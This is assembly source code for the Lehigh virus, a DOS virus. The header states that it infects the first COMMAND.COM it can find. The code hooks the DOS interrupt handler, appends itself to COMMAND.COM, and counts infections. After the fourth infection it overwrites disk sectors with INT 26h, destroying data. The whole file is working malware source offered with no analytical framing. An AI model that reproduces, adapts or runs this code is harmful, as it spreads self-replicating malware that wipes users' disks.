;THE LEHIGH VIRUS 
;THIS PROGRAM WHEN COMPLIED AND RUN WILL INFECT THE FIRST COMMAND.COM IT CAN 
;FIND
;BY WRITING ITSELF INTO THE STACK SPACE THEN UPDATING THE FIRST THREE BYTES
;SO IT WILL JUMP TO THE VIRAL CODE FIRST



vcode            segment byte public
        assume  cs:vcode,ds:vcode,es:vcode,ss:vcode
.RADIX 16
        org     0100h
vir_start:
        jmp     lehigh
        int     20h
vir_int21h:                
        push    ax
        push    bx
        
        cmp     ah,4bh
        je      handler

        cmp     ah,4eh
        je      handler

        jmp     int_21_dos              ;x286
;this is where the virus passes all exec calls and find first
;
handler:
    mov     bx,dx
    cmp     byte ptr [bx+ 01],':'
    jne     use_def_drve
    
    mov     al,[bx]                 ;put drive defined in al
    jmp     l122

use_def_drve:
    mov     ah,19h
    int     44h
    add     al,61h                  ;make the ret value a letter 

l122:
    push    ds
    push    cx
    push    dx
    push    di

    push    cs
    pop     ds

    mov     bx,offset host_file - 105h
    mov     [bx],al         
    mov     dx,bx
    mov     ax,3d02h                ;open file r/w
    int     44h

    jnb     file_open

    jmp     LEAVE_VIR_INT21

file_open:                              
    mov     bx,ax                   ; set file pointer to 
    mov     ax,4202h                ; end of the file we have opened
    xor     cx,cx                   ;
    mov     dx,cx                   ;
    int     44h                     ;
                    
    mov     dx,ax                   ;set pointer to start of file
    mov     [host_size -105h],ax          ;plus the size - 2
    sub     dx,2                    ;
    mov     ax,4200h                ;
    int     44h                     ;        

    mov     dx,offset buff - 105h   ;read 2 bytes from that file
    mov     cx,02h                  ;location
    mov     ah,3f                   ;
    int     44h                     ;

    cmp     word ptr[buff - 105h],65A9h
    jne     Not_infected
    jmp     if_drive_a              ;already infected

not_infected:
    xor     dx,dx                   ;set pointer to start of file
    mov     cx,dx                   ;
    mov     ax,4200h                ;
    int     44h                     ;

    mov     cx,03h                  ;read first 3 bytes
    mov     dx,offset buff -105h  ; from the start to the file
    mov     di,dx                   ;
    mov     ah,3fh                  ;
    int     44h                     ;

    mov     ax,[di+01]              ;calculate jump to location 
    add     ax,0103h                ;and save
    mov     [org_jmp - 105h],ax            ;
    
    mov     dx,[host_size - 105h]          ;take host size -viral size - 1        
    sub     dx,offset viral_size -101h           ;this is where in the host
    dec     dx                      ;the virus will place
    mov     [di],dx                 ;itself
    xor     cx,cx                   ;
    mov     ax,4200                 ;
    int     44h                     ;

    mov     al,[counter - 105h]            ;   reset counter 
    push    ax                      ;      for         save for this infection
    mov     byte ptr [counter - 105h],00   ;   new infection

    mov     cx,offset viral_size -101h           ; write the virus
    inc     cx                      ; for viral_size+1 to 
    xor     dx,dx                   ; host_file
    mov     ah,40h                  ;
    int     44h                     ;

    pop     ax                      ;restore counter
    mov     [counter - 105h],al               ;

    xor     cx,cx                   ;set file pointer
    mov     dx,01                   ;to start of host+1
    mov     ax,4200h                ;
    int     44h                     ;

    mov     ax,[di]                 ;fix the jump at start
    add     ax,offset lehigh -105h  ;of host to come lehigh
    sub     ax,3                    ;
    mov     [di],ax                 ;
    mov     dx,di                   ;
    mov     cx,02h                  ;
    mov     ah,40h                  ;
    int     44h                     ;

    inc     byte ptr [counter - 105h]      ;in counter
    cmp     byte ptr [counter - 105h],04   ; ten check if this is the 4th    
    jb      less_than_4             ; infection if yes
    jmp     destroy                 ; goto destroy       
    
    ;nop

less_than_4:
    mov     byte ptr [flag1 - 105h],00      
    cmp     byte ptr [def_drive - 105h],02h      
    jb      if_drive_a
    mov     byte ptr [flag1 - 105h],01h

if_drive_a:
    mov     ah,3eh
    int     44h

    cmp     byte ptr [flag1 - 105h],01
    je      not_drive_a
    jmp     leave_vir_int21

not_drive_a:    
    mov     byte ptr [flag1 - 105h],00               ;reset flag
    mov     bx, offset host_file - 105h      ; set host_file
    mov     al,[def_drive - 105h]                   ; to our def_drive
    add     al,61h                           ; then open that file
    mov     [bx],al                          ;
    mov     dx,bx                            ;
    mov     ax,3d02h                         ;
    int     44h                              ;

    JNB     NO_ERROR1
    JMP     LEAVE_VIR_INT21
    ;NOP

no_error1:

    MOV     BX,AX                   ;PUTS HANDLE OF HOST IN BX 
    MOV     AX,4202H                ; SET POINTER TO END OF FILE
    XOR     CX,CX                   ;
    MOV     DX,CX                   ;
    INT     44H                     ;

    MOV     DX,AX                   ; SIZE OF FILE IN DX
    SUB     DX,7H                   ;  MOVE POINTER TO -7 BYTES OF END OF
    MOV     AX,4200H                ; END OF FILE
    INT     44H                     ;

    MOV     CX,01H                  ;UPDATE COUNTER IN THIS
    MOV     DX,OFFSET COUNTER-105H  ;FILE
    MOV     AH,40H                  ;
    INT     44H                     ;

    MOV     AH,3EH                  ;CLOSE FILE
    INT     44H                     ;

    JMP     LEAVE_VIR_INT21
    ;NOP

DESTROY:
    MOV     AL,[DEF_DRIVE - 105h]          ;
    CMP     AL,02H                  ;
    JNB     WIPE_INFO               ;

    MOV     AH,19H                  ;GET DEFAULT DRIVE
    INT     44H                     ; IN AL

    MOV     BX,OFFSET HOST_FILE -105H
    MOV     DL,[BX]
    
    CMP     DL,'A'                        
    JE      ITS_DRIVE_A
    
    CMP     DL,'a'                        
    JE      ITS_DRIVE_A
    
    CMP     DL,'b'                        
    JE      ITS_DRIVE_B

    CMP     DL,'B'                        
    JE      ITS_DRIVE_B

    JMP     LEAVE_VIR_INT21
    
    ;NOP

ITS_DRIVE_A:
    MOV     DL,00
    JMP     CHK_HOME_DR                     ;X266
    ;NOP

ITS_DRIVE_B:
    MOV     DL,01

CHK_HOME_DR:
    CMP     AL,DL
    JNE     WIPE_INFO
    
    JMP     LEAVE_VIR_INT21        
    ;NOP        
    
WIPE_INFO:      
    MOV     SI,0FE00H
    MOV     DS,SI
    MOV     CX,0020H
    MOV     DX,0001H
    INT     26H
    POPF

    MOV     AH,09H
    MOV     DX,1840H
    INT     44

LEAVE_VIR_INT21:
    POP     DI
    POP     DX
    POP     CX
    POP     DS

INT_21_DOS:
    POP     BX
    POP     AX

    JMP     dword ptr cs:[OLD_INT21_OFF-105h]
    
OLD_INT21_OFF   DW      1460
OLD_INT21_SEG   DW      0234

LEHIGH:
        CALL    FIND_OFFSET
FIND_OFFSET:    
        POP     SI
        SUB     SI,3
        MOV     BX,SI
        SUB     BX,OFFSET LEHIGH - 105h
        PUSH    BX
        ADD     BX,OFFSET HOST_SIZE - 105H

        MOV     AH,19H
        INT     21H
        MOV     BYTE PTR [BX-01],AL      ;DEF_DRIVE
        

        MOV     AX,[BX]                  ;RESIZE MEMORY BLOCK
        ADD     AX,0100H                 ;TO THE ORGINAL FILE
        MOV     CL,04                    ;SIZE + 16 BYTES                   
        SHR     AX,CL                    ;
        INC     AX                       ;
        MOV     BX,AX                    ;
        MOV     AH,4AH                   ;
        INT     21H                      ;

        JNB     If_NO_ERROR2

        JMP     RET_HOST
        ;NOP

IF_NO_ERROR2:                                   
    MOV     CL,04                           ;ALLOCATE #PARAGRAHS NEEDED
    MOV     DX,offset viral_size -101h      ;FOR LEHIGH
    SHR     DX,CL                           ; 
    INC     DX                              ;
    MOV     BX,DX                           ;
    MOV     AH,48H                          ;
    INT     21H                             ;

    JNB     NO_ERROR3
    JMP     RET_HOST

NO_ERROR3:
    PUSH    ES
    PUSH    AX
    
    MOV     AX,3521                         ;GET AND SAVE INT21 VECTORS
    INT     21H                             ;
    MOV     [SI-04],BX                      ;OLD_INT21_OFS
    MOV     [SI-02],ES                      ;OLD_INT21_SEG

    POP     ES
    PUSH    SI

    SUB     SI,OFFSET LEHIGH - 105h
    XOR     DI,DI
    MOV     CX,offset viral_size -101
    INC     CX
    REPZ
    MOVSB

    POP     SI
    PUSH    DS

    MOV     DX,[SI-04]                      ;OLD_INT21_OFS
    MOV     AX,[SI-02]                      ;OLD_INT21_SEG        
    MOV     DS,AX                           ;HAVE INT 44 POINT TO
    MOV     AX,2544H                        ;INT 21 VECTORS
    INT     21H                             ;

    PUSH    ES                              ;USING THE OLD INT21 NOW
    POP     DS                              ;INT 44H
    XOR     DX,DX                           ;HAVE INT 21 CALLS GO TO 
    MOV     AX,2521H                        ;OUR HANDLER
    INT     44H                             ;

    POP     DS
    POP     ES

RET_HOST:
    POP     BX
    PUSH    [BX+OFFSET ORG_JMP-105H]
    RET

HOST_FILE       DB 'a:\command.com',00h

buff            db      95h, 0cch, 15h
        dw      0
org_jmp        dw      103h
flag1           db      0
counter         db      0
        db      0
def_drive       db      0
host_size       dw      0230h
marker          dw      065a9h

viral_size      equ     $ - 5

vcode            ends
         end     vir_start
         